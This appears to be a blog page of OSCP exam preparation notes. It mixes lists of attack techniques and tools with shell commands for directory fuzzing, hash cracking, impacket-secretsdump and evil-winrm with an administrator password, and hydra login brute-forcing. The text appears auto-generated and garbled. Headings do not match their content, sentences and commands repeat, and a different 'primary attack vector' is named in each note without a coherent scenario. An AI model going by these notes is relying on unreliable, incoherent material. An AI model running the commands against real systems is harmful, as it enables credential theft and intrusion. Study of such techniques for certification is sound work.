---
TitleSEO: "OSCP Exam Preparation Notes | ZureFX"
TitlePost: "OSCP Exam Preparation Notes"
Author: "ZureFX"
Description: "Personal notes on OSCP Exam Preparation Notes. Quick reference for pentesting and CTF challenges."
Keywords: "linux, networking, oscp"
URL: "https://zurefx.github.io/notes/note-oscp-exam-preparation-notes-102.html"
URL_IMAGES: ""
Date: "2025-12-28"
Tags: "Linux, Networking, OSCP"
Section: "notes"
Lang: "en"
main_img: "note-oscp-exam-preparation-notes-102"
Permalink: "/notes/note-oscp-exam-preparation-notes-102.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Node.js

### Resource-Based Constrained Delegation

- `nikto`
- `LXD Privilege Escalation`
- `Insecure Deserialization`
- `CSRF`
- `XXE`
- `Cron Job`

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.121.204.185/FUZZ
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.108.93.246
```

## SMB

### Elasticsearch

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files. The service was running without proper input validation, leading to injection vulnerabilities.

- `Insecure Deserialization`
- `enum4linux`
- `DNS Rebinding`

> **Note:** SUID Binary was identified as the primary attack vector in this scenario.

## enum4linux

### DNS Rebinding

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

- `nikto`
- `wmiexec`
- `sqlmap`
- `john`

> **Note:** LXD Privilege Escalation was identified as the primary attack vector in this scenario.

```bash
evil-winrm -i 10.112.77.39 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality.

## burpsuite

### wpscan

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.76.104.179/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.60.133.184 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Drupal

### IIS

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.121.174.65/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.110.143.25 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.94.213.16 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

- `ACL Abuse`
- `SQL Injection`
- `metasploit`
- `psexec`
- `atexec`
- `smbclient`

- `atexec`
- `hashcat`
- `Golden Ticket`
- `burpsuite`
- `AlwaysInstallElevated`
- `chisel`

> **Note:** Constrained Delegation was identified as the primary attack vector in this scenario.
